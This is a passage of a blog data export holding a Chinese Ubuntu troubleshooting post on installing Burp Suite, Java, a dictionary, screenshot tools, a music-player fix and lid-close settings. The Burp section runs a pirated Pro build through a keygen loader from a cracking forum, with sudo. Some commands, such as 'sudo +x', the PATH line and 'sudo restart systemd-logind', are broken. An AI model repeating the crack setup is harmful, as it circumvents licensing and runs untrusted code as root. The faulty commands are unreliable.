问题描述：\n\n有的时候想要笔记本合上盖子也能继续工作,但是没有设置过的笔记本合上盖后工作环境就停下来了。这就需要进行相关配置。\n\n### 解决方案\n\n`/etc/systemd/logind.conf`:登录管理配置文件\n\n```\nsudo vim /etc/systemd/logind.conf\n#修改处\nHandleLidSwitch=ignore\n```\n\n保存并退出,还需要重启服务生效。\n\n`sudo restart systemd-logind `\n\n下面是登录管理配置文件的一些细节\n\nHandlePowerKey=, HandleSuspendKey=, HandleHibernateKey=, HandleLidSwitch=, HandleLidSwitchDocked=\n\n当 power(电源)/sleep(休眠)/lid(合上盖子) 事件发生时， 应该执行何种操作： \n\n\"ignore\"(无操作), \"poweroff\"(关闭系统并切断电源), \"reboot\"(重新启动), \"halt\"(关闭系统但不切断电源), \"kexec\"(调用内核\"kexec\"函数), \"suspend\"(休眠到内存), \"hibernate\"(休眠到硬盘), \"hybrid-sleep\"(同时休眠到内存与硬盘), \"lock\"(锁屏) 。 \n\n注意， 只监视带有 \"power-switch\" 标签的 输入设备的 key(按下按钮)/lid(合上盖子) 事件。 如果主机插入了一个扩展坞(docking station) 或者连接了多个显示器， 那么\"合上盖子\"将执行 HandleLidSwitchDocked= 动作， 否则将执行 HandleLidSwitch= 动作。 \n\n下面是各选项的默认值： \n\nHandlePowerKey=poweroff 、 HandleSuspendKey=suspend 、 HandleLidSwitch=suspend 、 \n\nHandleLidSwitchDocked=ignore 、 HandleHibernateKey=hibernate\n\n","source":"_posts/ubuntn踩坑手册.md","raw":"---\ntitle: ubuntn踩坑手册\ndate: 2018-10-01 15:07:48\ntags: [疑难杂症]\ncategories: ubuntu\n\n---\n\n# ubuntn踩坑手册\n\n------\n\n## 目录\n\n1. [安装主题后Ctrl+Alt+T 终端快捷方式无效](#001 )\n2. [安装burpsuite](#002)\n3. [安装有道词典](#003)\n4. [截图工具 Shutter](#004)\n5. [安装DeepinScrot](#005)\n6. [Ubuntu18.04双击网易云音乐无法启动](#006)\n7. [Ubuntu18.04设置合上盖子时不进入休眠](#007)\n\n<span id=\"001\"></span>\n\n## 安装主题后Ctrl+Alt+T 终端快捷方式无效\n\n解决方案:手动添加快捷方式。\n\n<span id=\"002\"></span>\n## Ubuntu中安装burpsuite\n\n[参考文章(鸣谢)：一纸笔墨-Ubuntu中安装burp suite](https://www.jianshu.com/p/3e7bb41a1464)\n\n### 安装java环境\n\njava 8 下载地址：\n\nhttps://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html\n\n选择`jdk-8u181-linux-x64.tar.gz`(当前最新的64版本,32位下载对应版本)。\n\n下载完成后,以root用户进入下载目录,将下载到的`jdk-8u181-linux-x64.tar.gz`解压:`tar zxvf jdk-8u181-linux-x64.tar.gz`\n\n将解压的得到的`jdk1.8.0_181`文件夹复制到/opt目录:`mv jdk1.8.0_181 /opt/`\n\n> /opt目录用来安装附加软件包，是用户级的程序目录，可以理解为D:/Software。安装到/opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。opt有可选的意思，这里可以用于放置第三方大型软件（或游戏），当你不需要时，直接rm -rf 掉即可。在硬盘容量不够时，也可将/opt单独挂载到其他磁盘上使用。\n\n进入/bin目录(`cd /bin`)，并在/bin目录下创建java软链接：`ln -s /opt/jdk1.8.0_181/bin/java java`\n\n> bin为binary的简写，/bin目录主要放置系统的必备执行文件，例如: cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。\n\n在/bin目录创建了一个Java的软链接使我们都能使用Java。\n\n> ln是linux中又一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接.当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。\n>\n> -s 软链接(符号链接)\n>\n> 软链接：\n>\n> 1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式\n>\n> 2.软链接可以 跨文件系统 ，硬链接不可以\n>\n> 3.软链接可以对一个不存在的文件名进行链接\n>\n> 4.软链接可以对目录进行链接\n\n进入/etc目录,修改/etc/profile文件，在文件末尾加上四行：\n\n`export JAVA_HOME=/opt/jdk1.8.0_112`#注意版本\n\n`export JRE_HOME=${JAVA_HOME}/jre`\n\n`export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib`\n\n`export PATH={JAVA_HOME}/bin:$PATH`\n\n> /etc/profile文件用于修改环境变量，在这里修改的内容是对所有用户起作用的\n\n最后使用命令`source /etc/profile`重新执行文件使环境变量生效，之后输入`echo $JAVA_HOME`，如果出现`/opt/jdk1.8.0_181`则说明安装应该是成功了。\n\n### 安装burpsuite\n\n从52pojie下载burpsuite,将解压得到的burp-loader-keygen.jar和burpsuite_pro_v1.7.37.jar文件移动到`/opt/burpsuite`(没有就创建一个)。在该目录下用`sudo java -jar burp-loader-keygen.jar`来运行注册机,用注册机登录。但是这样不方便,有以下解决方案。\n\n> **/usr/bin**　是在后期安装的一些软件的运行脚本\n\n```\ncd /opt/burpsuite\nsudo +x burp-loader-keygen.jar burpsuite_pro_v1.7.37.jar \nsudo vim /usr/bin/burpsuite\n    #!/bin/bash\n    java -Xbootclasspath/p:/opt/burpsuite/burp-loader-keygen.jar -jar /opt/burpsuite/burpsuite_pro_v1.7.37.jar\n\nsudo chmod +x /usr/bin/burpsuite\n```\n\n之后就可以直接输入`sudo burpsuite`就可以运行了。\n\n<span id=\"003\"></span>\n## 安装有道词典\n\nhttps://github.com/yomun/youdaodict_5.5\n\n### 有道词典 v1.1.1 ( 支持 PyQt 5.5 或以上 )\n\n这个有道词典是从 Deepin 15.4.1 (youdao-dict_1.0.8-1_amd64.deb) 取出, 然后重新打包成 Ubuntu 能用的 deb 安装包\n它支持 Ubuntu 16.10 / Fedora 24 / OpenSUSE 42.2 等开始的 Linux 分发版\n\n<http://packages.deepin.com/deepin/pool/main/y/youdao-dict/>\n\n1. 取得有道词典安装包 (需要3D加速, 假设显卡驱动已安装了)\n\n```\nwget https://github.com/yomun/youdaodict_5.5/raw/master/youdao-dict_1.1.1-0~ubuntu_amd64.deb\n```\n\n1. 如有 pip3 安装的 PyQt5, 卸载之.. (5.6 开始的版本, 因它缺所需旧模块)\n\n```\n如有显示 PyQt5 (5.10.1), 卸载之..\n$ pip3 list | grep PyQt5\n$ pip3 uninstall pyqt5\n\nroot 户口也一样要\n$ sudo pip3 list | grep PyQt5\n$ sudo pip3 uninstall pyqt5\n```\n\n1. 安装依赖软件包\n\n- Ubuntu 16.04 - 18.04 / Debian 9.1 / Linux Mint 18.2 / Zorin OS 12.1\n\n```\nsudo su\n$ apt install python3\n\n$ apt install python3-dbus python3-lxml python3-pil python3-requests python3-xdg python3-xlib\n$ apt-get install -f -y\n$ apt install python3-pyqt5 python3-pyqt5.qtmultimedia python3-pyqt5.qtquick python3-pyqt5.qtwebkit\n\n$ apt install gir1.2-appindicator3-0.1 qml-module-qtgraphicaleffects qml-module-qtquick-controls\n$ apt install libqt5multimedia5-plugins ttf-wqy-microhei\n$ apt install tesseract-ocr tesseract-ocr-eng tesseract-ocr-chi-sim tesseract-ocr-chi-tra\n\n$ apt install ubuntu-restricted-extras\n\n我这里python3-lxml没安装上,单独来一次。\n$ apt-get install python3-lxml\n$ dpkg -i youdao-dict_1.1.1-0~ubuntu_amd64.deb\n上面的没问题到这步就成功了。\nUbuntu 18.04 用 fonts-wqy-microhei 取代了 ttf-wqy-microhei\n```\n<span id=\"004\"></span>\n## 截图工具Shutter\n\nubuntu 安装截图工具 Shutter，并设置快捷键 Ctrl+Alt+A\n\n### 安装截图工具 Shutter\n\n```\n$ sudo apt-get install shutter\n```\n\n### 设置 Shutter 截屏快捷键 [ctrl + Alt + A]\n\n1. Ubuntu右上角右键 - 打开系统设置 - 打开键盘 - 点击快捷键 - 自定义快捷键\n2. 点击 + 号， 添加快捷键。 名称随便命名，如 shutter select, 命令 设置为 shutter -s \n   点击应用 - 点击 Disabled - 然后迅速按下 ctrl + alt + a\n\n<span id=\"005\"></span>\n\n## 安装DeepinScrot\n\nDeepinScrot : 这是一个在深度(Deepin)操作系统中使用的截图工具。 \n深度操作系统是中国国产的基于Linux的操作系统, 界面还蛮清新的, 由武汉深之度科技有限公司研发。\n\nDeepinScrot截图工具类似于QQ,适合国人。\n\n### 安装\n\n```\nwget http://packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb\nsudo dpkg -i deepin-scrot_2.0-0deepin_all.deb \nsudo apt-get install -f\n#重新\nsudo dpkg -i deepin-scrot_2.0-0deepin_all.deb \n#安装成功\n```\n\n### 使用DeepinScrot\n\n```\ndeepin-scrot \n```\n\n### 设置DeepinScrot快捷键\n\n　 ubuntu 设置-键盘－自定义快捷键 \n　 填写名称，命令(deepin-scrot)，快捷键 \n\n<span id=\"006\"></span>\n\n## Ubuntu18.04双击网易云音乐无法启动\n\n解决方案来自知乎。\n\nUbuntu 18.04 装了网易云音乐，难道只能用 sudo 启动吗？ - Fancy的回答 - 知乎\nhttps://www.zhihu.com/question/277330447/answer/478510195\n\n### 问题描述\n\n只能在命令行下用`sudo netease-cloud-music`启动网易云音乐,双击网易云音乐无法启动。\n\n### 问题产生原因\n\n双击图标无法启动是因为环境变量 SESSION_MANAGER在捣乱。sudo后该环境变量变为了空。\n\n```\n#输出为空\nsudo env|grep SESSION_MANAGER\n#有输出 \nenv|grep SESSION_MANAGER\n```\n\n### 解决方案\n\n```\n# 对应行修改为 Exec=sh -c \"unset SESSION_MANAGER && netease-cloud-music %U\" \nsudo vim /usr/share/applications/netease-cloud-music.desktop\n# 修改Exec=\nsh -c \"unset SESSION_MANAGER && netease-cloud-music\"\n```\n\n![006_1](/img/UbuntuPro/006_1.png)\n\n保存并退出后即可双击打开网易云音乐。\n\n<span id=\"007\"></span>\n\n## Ubuntu18.04设置合上盖子时不进入休眠\n\n### 问题描述：\n\n有的时候想要笔记本合上盖子也能继续工作,但是没有设置过的笔记本合上盖后工作环境就停下来了。这就需要进行相关配置。\n\n### 解决方案\n\n`/etc/systemd/logind.conf`:登录管理配置文件\n\n```\nsudo vim /etc/systemd/logind.conf\n#修改处\nHandleLidSwitch=ignore\n```\n\n保存并退出,还需要重启服务生效。\n\n`sudo restart systemd-logind `\n\n下面是登录管理配置文件的一些细节\n\nHandlePowerKey=, HandleSuspendKey=, HandleHibernateKey=, HandleLidSwitch=, HandleLidSwitchDocked=\n\n当 power(电源)/sleep(休眠)/lid(合上盖子) 事件发生时， 应该执行何种操作： \n\n\"ignore\"(无操作), \"poweroff\"(关闭系统并切断电源), \"reboot\"(重新启动), \"halt\"(关闭系统但不切断电源), \"kexec\"(调用内核\"kexec\"函数), \"suspend\"(休眠到内存), \"hibernate\"(休眠到硬盘), \"hybrid-sleep\"(同时休眠到内存与硬盘), \"lock\"(锁屏) 。 \n\n注意， 只监视带有 \"power-switch\" 标签的 输入设备的 key(按下按钮)/lid(合上盖子) 事件。 如果主机插入了一个扩展坞(docking station) 或者连接了多个显示器， 那么\"合上盖子\"将执行 HandleLidSwitchDocked= 动作， 否则将执行 HandleLidSwitch= 动作。 \n\n下面是各选项的默认值： \n\nHandlePowerKey=poweroff 、 HandleSuspendKey=suspend 、 HandleLidSwitch=suspend 、 \n\nHandleLidSwitchDocked=ignore 、 HandleHibernateKey=hibernate\n\n","slug":"ubuntn踩坑手册","published":1,"updated":"2019-06-19T17:23:13.401Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istl200a74dsbl1xi868p","content":"<h1 id=\"ubuntn踩坑手册\"><a href=\"#ubuntn踩坑手册\" class=\"headerlink\" title=\"ubuntn踩坑手册\"></a>ubuntn踩坑手册</h1><hr>\n<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ol>\n<li><a href=\"#001\">安装主题后Ctrl+Alt+T 终端快捷方式无效</a></li>\n<li><a href=\"#002\">安装burpsuite</a></li>\n<li><a href=\"#003\">安装有道词典</a></li>\n<li><a href=\"#004\">截图工具 Shutter</a></li>\n<li><a href=\"#005\">安装DeepinScrot</a></li>\n<li><a href=\"#006\">Ubuntu18.04双击网易云音乐无法启动</a></li>\n<li><a href=\"#007\">Ubuntu18.04设置合上盖子时不进入休眠</a></li>\n</ol>\n<p><span id=\"001\"></span></p>\n<h2 id=\"安装主题后Ctrl-Alt-T-终端快捷方式无效\"><a href=\"#安装主题后Ctrl-Alt-T-终端快捷方式无效\" class=\"headerlink\" title=\"安装主题后Ctrl+Alt+T 终端快捷方式无效\"></a>安装主题后Ctrl+Alt+T 终端快捷方式无效</h2><p>解决方案:手动添加快捷方式。</p>\n<p><span id=\"002\"></span></p>\n<h2 id=\"Ubuntu中安装burpsuite\"><a href=\"#Ubuntu中安装burpsuite\" class=\"headerlink\" title=\"Ubuntu中安装burpsuite\"></a>Ubuntu中安装burpsuite</h2><p><a href=\"https://www.jianshu.com/p/3e7bb41a1464\" target=\"_blank\" rel=\"noopener\">参考文章(鸣谢)：一纸笔墨-Ubuntu中安装burp suite</a></p>\n<h3 id=\"安装java环境\"><a href=\"#安装java环境\" class=\"headerlink\" title=\"安装java环境\"></a>安装java环境</h3><p>java 8 下载地址：</p>\n<p><a href=\"https://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html\" target=\"_blank\" rel=\"noopener\">https://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html</a></p>\n<p>选择<code>jdk-8u181-linux-x64.tar.gz</code>(当前最新的64版本,32位下载对应版本)。</p>\n<p>下载完成后,以root用户进入下载目录,将下载到的<code>jdk-8u181-linux-x64.tar.gz</code>解压:<code>tar zxvf jdk-8u181-linux-x64.tar.gz</code></p>\n<p>将解压的得到的<code>jdk1.8.0_181</code>文件夹复制到/opt目录:<code>mv jdk1.8.0_181 /opt/</code></p>\n<blockquote>\n<p>/opt目录用来安装附加软件包，是用户级的程序目录，可以理解为D:/Software。安装到/opt目录下的程序，它所有的数据、库文件等等都是放在同个目录下面。opt有可选的意思，这里可以用于放置第三方大型软件（或游戏），当你不需要时，直接rm -rf 掉即可。在硬盘容量不够时，也可将/opt单独挂载到其他磁盘上使用。</p>\n</blockquote>\n<p>进入/bin目录(<code>cd /bin</code>)，并在/bin目录下创建java软链接：<code>ln -s /opt/jdk1.8.0_181/bin/java java</code></p>\n<blockquote>\n<p>bin为binary的简写，/bin目录主要放置系统的必备执行文件，例如: cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。</p>\n</blockquote>\n<p>在/bin目录创建了一个Java的软链接使我们都能使用Java。</p>\n<blockquote>\n<p>ln是linux中又一个非常重要命令，它的功能是为某一个文件在另外一个位置建立一个同步的链接.当我们需要在不同的目录，用到相同的文件时，我们不需要在每一个需要的目录下都放一个必须相同的文件，我们只要在某个固定的目录，放上该文件，然后在 其它的目录下用ln命令链接（link）它就可以，不必重复的占用磁盘空间。</p>\n<p>-s 软链接(符号链接)</p>\n<p>软链接：</p>\n<p>1.软链接，以路径的形式存在。类似于Windows操作系统中的快捷方式</p>\n<p>2.软链接可以 跨文件系统 ，硬链接不可以</p>\n<p>3.软链接可以对一个不存在的文件名进行链接</p>\n<p>4.软链接可以对目录进行链接</p>\n</blockquote>\n<p>进入/etc目录,修改/etc/profile文件，在文件末尾加上四行：</p>\n<p><code>export JAVA_HOME=/opt/jdk1.8.0_112</code>#注意版本</p>\n<p><code>export JRE_HOME=${JAVA_HOME}/jre</code></p>\n<p><code>export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib</code></p>\n<p><code>export PATH={JAVA_HOME}/bin:$PATH</code></p>\n<blockquote>\n<p>/etc/profile文件用于修改环境变量，在这里修改的内容是对所有用户起作用的</p>\n</blockquote>\n<p>最后使用命令<code>source /etc/profile</code>重新执行文件使环境变量生效，之后输入<code>echo $JAVA_HOME</code>，如果出现<code>/opt/jdk1.8.0_181</code>则说明安装应该是成功了。</p>\n<h3 id=\"安装burpsuite\"><a href=\"#安装burpsuite\" class=\"headerlink\" title=\"安装burpsuite\"></a>安装burpsuite</h3><p>从52pojie下载burpsuite,将解压得到的burp-loader-keygen.jar和burpsuite_pro_v1.7.37.jar文件移动到<code>/opt/burpsuite</code>(没有就创建一个)。在该目录下用<code>sudo java -jar burp-loader-keygen.jar</code>来运行注册机,用注册机登录。但是这样不方便,有以下解决方案。</p>\n<blockquote>\n<p><strong>/usr/bin</strong>　是在后期安装的一些软件的运行脚本</p>\n</blockquote>\n<figure class=\"highlight armasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">cd</span> /<span class=\"meta\">opt</span>/<span class=\"keyword\">burpsuite</span></span><br><span class=\"line\"><span class=\"keyword\">sudo </span>+x <span class=\"keyword\">burp-loader-keygen.jar </span><span class=\"keyword\">burpsuite_pro_v1.7.37.jar </span></span><br><span class=\"line\"><span class=\"symbol\">sudo</span> vim /usr/<span class=\"keyword\">bin/burpsuite</span></span><br><span class=\"line\"><span class=\"keyword\"> </span>   #!/<span class=\"keyword\">bin/bash</span></span><br><span class=\"line\"><span class=\"keyword\"> </span>   java -Xbootclasspath/p:/<span class=\"meta\">opt</span>/<span class=\"keyword\">burpsuite/burp-loader-keygen.jar </span>-jar /<span class=\"meta\">opt</span>/<span class=\"keyword\">burpsuite/burpsuite_pro_v1.7.37.jar</span></span><br><span class=\"line\"><span class=\"keyword\"></span></span><br><span class=\"line\"><span class=\"keyword\">sudo </span>chmod +x /usr/<span class=\"keyword\">bin/burpsuite</span></span><br></pre></td></tr></table></figure>\n\n<p>之后就可以直接输入<code>sudo burpsuite</code>就可以运行了。</p>\n<p><span id=\"003\"></span></p>\n<h2 id=\"安装有道词典\"><a href=\"#安装有道词典\" class=\"headerlink\" title=\"安装有道词典\"></a>安装有道词典</h2><p><a href=\"https://github.com/yomun/youdaodict_5.5\" target=\"_blank\" rel=\"noopener\">https://github.com/yomun/youdaodict_5.5</a></p>\n<h3 id=\"有道词典-v1-1-1-支持-PyQt-5-5-或以上\"><a href=\"#有道词典-v1-1-1-支持-PyQt-5-5-或以上\" class=\"headerlink\" title=\"有道词典 v1.1.1 ( 支持 PyQt 5.5 或以上 )\"></a>有道词典 v1.1.1 ( 支持 PyQt 5.5 或以上 )</h3><p>这个有道词典是从 Deepin 15.4.1 (youdao-dict_1.0.8-1_amd64.deb) 取出, 然后重新打包成 Ubuntu 能用的 deb 安装包<br>它支持 Ubuntu 16.10 / Fedora 24 / OpenSUSE 42.2 等开始的 Linux 分发版</p>\n<p><a href=\"http://packages.deepin.com/deepin/pool/main/y/youdao-dict/\" target=\"_blank\" rel=\"noopener\">http://packages.deepin.com/deepin/pool/main/y/youdao-dict/</a></p>\n<ol>\n<li>取得有道词典安装包 (需要3D加速, 假设显卡驱动已安装了)</li>\n</ol>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"regexp\">//gi</span>thub.com<span class=\"regexp\">/yomun/y</span>oudaodict_5.<span class=\"number\">5</span><span class=\"regexp\">/raw/m</span>aster<span class=\"regexp\">/youdao-dict_1.1.1-0~ubuntu_amd64.deb</span></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>如有 pip3 安装的 PyQt5, 卸载之.. (5.6 开始的版本, 因它缺所需旧模块)</li>\n</ol>\n<figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如有显示 PyQt5 (<span class=\"number\">5.10</span>.<span class=\"number\">1</span>), 卸载之..</span><br><span class=\"line\"><span class=\"variable\">$ </span>pip3 list | grep PyQt5</span><br><span class=\"line\"><span class=\"variable\">$ </span>pip3 uninstall pyqt5</span><br><span class=\"line\"></span><br><span class=\"line\">root 户口也一样要</span><br><span class=\"line\"><span class=\"variable\">$ </span>sudo pip3 list | grep PyQt5</span><br><span class=\"line\"><span class=\"variable\">$ </span>sudo pip3 uninstall pyqt5</span><br></pre></td></tr></table></figure>\n\n<ol>\n<li>安装依赖软件包</li>\n</ol>\n<ul>\n<li>Ubuntu 16.04 - 18.04 / Debian 9.1 / Linux Mint 18.2 / Zorin OS 12.1</li>\n</ul>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo su</span><br><span class=\"line\">$ apt install <span class=\"keyword\">python3</span></span><br><span class=\"line\"></span><br><span class=\"line\">$ apt install <span class=\"keyword\">python3</span>-dbus <span class=\"keyword\">python3</span>-lxml <span class=\"keyword\">python3</span>-pil <span class=\"keyword\">python3</span>-requests <span class=\"keyword\">python3</span>-xdg <span class=\"keyword\">python3</span>-xlib</span><br><span class=\"line\">$ apt-<span class=\"built_in\">get</span> install -<span class=\"keyword\">f</span> -<span class=\"keyword\">y</span></span><br><span class=\"line\">$ apt install <span class=\"keyword\">python3</span>-pyqt5 <span class=\"keyword\">python3</span>-pyqt5.qtmultimedia <span class=\"keyword\">python3</span>-pyqt5.qtquick <span class=\"keyword\">python3</span>-pyqt5.qtwebkit</span><br><span class=\"line\"></span><br><span class=\"line\">$ apt install gir1.<span class=\"number\">2</span>-appindicator3-<span class=\"number\">0.1</span> qml-module-qtgraphicaleffects qml-module-qtquick-controls</span><br><span class=\"line\">$ apt install libqt5multimedia5-plugins ttf-wqy-microhei</span><br><span class=\"line\">$ apt install tesseract-ocr tesseract-ocr-eng tesseract-ocr-chi-<span class=\"keyword\">sim</span> tesseract-ocr-chi-tra</span><br><span class=\"line\"></span><br><span class=\"line\">$ apt install ubuntu-restricted-extras</span><br><span class=\"line\"></span><br><span class=\"line\">我这里<span class=\"keyword\">python3</span>-lxml没安装上,单独来一次。</span><br><span class=\"line\">$ apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python3</span>-lxml</span><br><span class=\"line\">$ dpkg -i youdao-dict_1.<span class=\"number\">1.1</span>-<span class=\"number\">0</span>~ubuntu_amd64.<span class=\"keyword\">deb</span></span><br><span class=\"line\">上面的没问题到这步就成功了。</span><br><span class=\"line\">Ubuntu <span class=\"number\">18.04</span> 用 fonts-wqy-microhei 取代了 ttf-wqy-microhei</span><br></pre></td></tr></table></figure>\n\n<p><span id=\"004\"></span></p>\n<h2 id=\"截图工具Shutter\"><a href=\"#截图工具Shutter\" class=\"headerlink\" title=\"截图工具Shutter\"></a>截图工具Shutter</h2><p>ubuntu 安装截图工具 Shutter，并设置快捷键 Ctrl+Alt+A</p>\n<h3 id=\"安装截图工具-Shutter\"><a href=\"#安装截图工具-Shutter\" class=\"headerlink\" title=\"安装截图工具 Shutter\"></a>安装截图工具 Shutter</h3><figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-<span class=\"builtin-name\">get</span> install shutter</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置-Shutter-截屏快捷键-ctrl-Alt-A\"><a href=\"#设置-Shutter-截屏快捷键-ctrl-Alt-A\" class=\"headerlink\" title=\"设置 Shutter 截屏快捷键 [ctrl + Alt + A]\"></a>设置 Shutter 截屏快捷键 [ctrl + Alt + A]</h3><ol>\n<li>Ubuntu右上角右键 - 打开系统设置 - 打开键盘 - 点击快捷键 - 自定义快捷键</li>\n<li>点击 + 号， 添加快捷键。 名称随便命名，如 shutter select, 命令 设置为 shutter -s<br>点击应用 - 点击 Disabled - 然后迅速按下 ctrl + alt + a</li>\n</ol>\n<p><span id=\"005\"></span></p>\n<h2 id=\"安装DeepinScrot\"><a href=\"#安装DeepinScrot\" class=\"headerlink\" title=\"安装DeepinScrot\"></a>安装DeepinScrot</h2><p>DeepinScrot : 这是一个在深度(Deepin)操作系统中使用的截图工具。<br>深度操作系统是中国国产的基于Linux的操作系统, 界面还蛮清新的, 由武汉深之度科技有限公司研发。</p>\n<p>DeepinScrot截图工具类似于QQ,适合国人。</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:<span class=\"comment\">//packages.linuxdeepin.com/deepin/pool/main/d/deepin-scrot/deepin-scrot_2.0-0deepin_all.deb</span></span><br><span class=\"line\">sudo dpkg -<span class=\"selector-tag\">i</span> deepin-scrot_2.<span class=\"number\">0</span>-<span class=\"number\">0</span>deepin_all<span class=\"selector-class\">.deb</span> </span><br><span class=\"line\">sudo apt-get install -f</span><br><span class=\"line\">#重新</span><br><span class=\"line\">sudo dpkg -<span class=\"selector-tag\">i</span> deepin-scrot_2.<span class=\"number\">0</span>-<span class=\"number\">0</span>deepin_all<span class=\"selector-class\">.deb</span> </span><br><span class=\"line\">#安装成功</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"使用DeepinScrot\"><a href=\"#使用DeepinScrot\" class=\"headerlink\" title=\"使用DeepinScrot\"></a>使用DeepinScrot</h3><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">deepin-scrot</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"设置DeepinScrot快捷键\"><a href=\"#设置DeepinScrot快捷键\" class=\"headerlink\" title=\"设置DeepinScrot快捷键\"></a>设置DeepinScrot快捷键</h3><p>　 ubuntu 设置-键盘－自定义快捷键<br>　 填写名称，命令(deepin-scrot)，快捷键 </p>\n<p><span id=\"006\"></span></p>\n<h2 id=\"Ubuntu18-04双击网易云音乐无法启动\"><a href=\"#Ubuntu18-04双击网易云音乐无法启动\" class=\"headerlink\" title=\"Ubuntu18.04双击网易云音乐无法启动\"></a>Ubuntu18.04双击网易云音乐无法启动</h2><p>解决方案来自知乎。</p>\n<p>Ubuntu 18.04 装了网易云音乐，难道只能用 sudo 启动吗？ - Fancy的回答 - 知乎<br><a href=\"https://www.zhihu.com/question/277330447/answer/478510195\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/277330447/answer/478510195</a></p>\n<h3 id=\"问题描述\"><a href=\"#问题描述\" class=\"headerlink\" title=\"问题描述\"></a>问题描述</h3><p>只能在命令行下用<code>sudo netease-cloud-music</code>启动网易云音乐,双击网易云音乐无法启动。</p>\n<h3 id=\"问题产生原因\"><a href=\"#问题产生原因\" class=\"headerlink\" title=\"问题产生原因\"></a>问题产生原因</h3><p>双击图标无法启动是因为环境变量 SESSION_MANAGER在捣乱。sudo后该环境变量变为了空。</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#输出为空</span></span><br><span class=\"line\">sudo env<span class=\"string\">|grep SESSION_MANAGER</span></span><br><span class=\"line\"><span class=\"meta\">#有输出 </span></span><br><span class=\"line\">env<span class=\"string\">|grep SESSION_MANAGER</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h3><figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\"># 对应行修改为 Exec=sh -c <span class=\"string\">\"unset SESSION_MANAGER &amp;&amp; netease-cloud-music %U\"</span> </span></span><br><span class=\"line\">sudo vim <span class=\"meta-keyword\">/usr/</span>share<span class=\"meta-keyword\">/applications/</span>netease-cloud-music.desktop</span><br><span class=\"line\"><span class=\"meta\"># 修改Exec=</span></span><br><span class=\"line\">sh -c <span class=\"string\">\"unset SESSION_MANAGER &amp;&amp; netease-cloud-music\"</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/UbuntuPro/006_1.png\" alt=\"006_1\"></p>\n<p>保存并退出后即可双击打开网易云音乐。</p>\n<p><span id=\"007\"></span></p>\n<h2 id=\"Ubuntu18-04设置合上盖子时不进入休眠\"><a href=\"#Ubuntu18-04设置合上盖子时不进入休眠\" class=\"headerlink\" title=\"Ubuntu18.04设置合上盖子时不进入休眠\"></a>Ubuntu18.04设置合上盖子时不进入休眠</h2><h3 id=\"问题描述：\"><a href=\"#问题描述：\" class=\"headerlink\" 